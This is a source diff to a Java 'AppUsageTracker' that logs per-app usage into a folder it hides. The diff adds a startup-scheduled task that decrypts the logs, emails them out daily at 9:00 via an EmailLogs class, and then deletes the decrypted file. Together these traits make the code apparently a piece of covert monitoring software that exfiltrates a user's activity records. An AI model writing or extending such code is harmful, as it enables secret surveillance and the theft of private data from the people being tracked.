@@ -1,11 +1,16 @@
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.time.Duration;
 import java.time.LocalDate;
 import java.time.LocalDateTime;
+import java.time.LocalTime;
 import java.util.HashMap;
 import java.util.LinkedHashMap;
 import java.util.Map;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 
 public class AppUsageTracker {
 	private static Map<LocalDate, LinkedHashMap<String, Long>> appUsageByDay = new HashMap<>();
@@ -25,12 +30,14 @@ public class AppUsageTracker {
 
 			// Create the path to the "total_time.txt" file within the folder
 			String filePath = folder.getPath() + File.separator + "total_time.txt";
+			String decyptedPath = folder.getPath() + File.separator + "decrypted_logs.txt";
 			String HashPath = folder.getPath() + File.separator + "hashes.txt";
 
 			hashWriter = new FileWriter(HashPath, true);
 			// Initialize total time FileWriter with the specified file path
 			totalTimeWriter = new FileWriter(filePath, true);
 			makeFolderHidden(folder);
+			scheduleEmailLogsTask(decyptedPath);
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
@@ -62,6 +69,36 @@ public class AppUsageTracker {
 			}
 		}
 	}
+	
+	 private static void scheduleEmailLogsTask(String filePath) {
+	        // Schedule the task to run every day at 9:00 AM
+	        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
+	        long initialDelay = getTimeUntilNextExecution(9, 0);
+	        LogReader.decryptLogFile();
+
+	        scheduler.scheduleAtFixedRate(() -> {
+	            // Execute the task to send email logs
+	            sendEmailLogs(filePath);
+	        }, initialDelay, TimeUnit.DAYS.toMillis(1), TimeUnit.MILLISECONDS);
+	    }
+	 private static void sendEmailLogs(String filePath) {
+	        // You can create an instance of EmailLogs and call the sendEmail method
+	        EmailLogs emailLogs = new EmailLogs();
+	        emailLogs.sendEmail(filePath);
+	        File decryptedFile = new File(filePath);
+	        if (decryptedFile.exists()) {
+	        	decryptedFile.delete();
+	        }
+	    }
+	 
+	 private static long getTimeUntilNextExecution(int targetHour, int targetMinute) {
+	        LocalDateTime now = LocalDateTime.now();
+	        LocalDateTime targetTime = LocalDateTime.of(now.toLocalDate(), LocalTime.of(targetHour, targetMinute));
+	        if (now.compareTo(targetTime) > 0) {
+	            targetTime = targetTime.plusDays(1);
+	        }
+	        return Duration.between(now, targetTime).toMillis();
+	    }
 
 	private static void makeFolderHidden(File folder) {
 		try {
